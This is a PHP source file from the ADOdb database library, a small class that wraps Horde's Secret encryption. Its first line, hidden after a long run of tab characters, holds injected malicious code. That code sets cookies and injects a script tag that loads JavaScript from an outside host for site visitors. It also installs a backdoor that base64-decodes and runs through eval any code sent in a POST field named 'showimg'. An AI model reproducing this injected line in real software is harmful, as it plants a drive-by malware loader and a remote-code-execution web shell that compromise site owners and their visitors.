<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


/*
v4.991 16 Oct 2008  (c) 2000-2008 John Lim (jlim#natsoft.com). All rights reserved.
         Contributed by Ross Smith (adodb@netebb.com). 
  Released under both BSD license and Lesser GPL library license.
  Whenever there is any discrepancy between the two licenses,
  the BSD license will take precedence.
	  Set tabs to 4 for best viewing.

*/

@define('HORDE_BASE', dirname(dirname(dirname(__FILE__))) . '/horde');

if (!is_dir(HORDE_BASE)) {
	trigger_error(sprintf('Directory not found: \'%s\'', HORDE_BASE), E_USER_ERROR);
	return 0;
}

include_once HORDE_BASE . '/lib/Horde.php';
include_once HORDE_BASE . '/lib/Secret.php';

/**

NOTE: On Windows 2000 SP4 with PHP 4.3.1, MCrypt 2.4.x, and Apache 1.3.28,
the session didn't work properly.

This may be resolved with 4.3.3.

 */
class ADODB_Encrypt_Secret {
	/**
	 */
	function write($data, $key) {
		return Secret::write($key, $data);
	}

	/**
	 */
	function read($data, $key) {
		return Secret::read($key, $data);
	}

}

return 1;

?>
